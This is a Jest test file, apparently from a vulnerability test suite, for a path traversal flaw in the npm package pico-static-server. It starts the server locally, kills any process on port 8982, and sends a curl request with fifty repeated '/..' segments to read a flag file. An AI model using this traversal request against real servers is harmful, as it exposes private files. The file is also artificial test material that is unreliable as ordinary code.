const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v17 = '/..'.repeat(50);
    const v18 = v17 + pathToFlag;
    return v18;
};
const v31 = done => {
    const v19 = expect.assertions(1);
    v19;
    const createServer = require('pico-static-server');
    const fs = require('fs');
    const v20 = require('child_process');
    const exec = v20.exec;
    const v21 = fs.readFileSync(pathToFlag);
    let hostsFile = v21.toString();
    const a = require('child_process');
    try {
        const v22 = () => {
        };
        const v23 = a.execSync('fuser -k 8982/tcp', v22);
        v23;
    } catch (e) {
    }
    const v24 = {
        defaultFile: 'index.html',
        staticPath: '.',
        port: 8982
    };
    const staticServer = createServer(v24);
    const v25 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8982${ v25 }"`;
    const v29 = (error, stdout) => {
        const v26 = expect(stdout);
        const v27 = v26.toBe(hostsFile);
        v27;
        const v28 = done();
        v28;
    };
    const v30 = exec(attack_string, v29);
    v30;
};
const v32 = test('Path Traversal in pico-static-server', v31);
v32;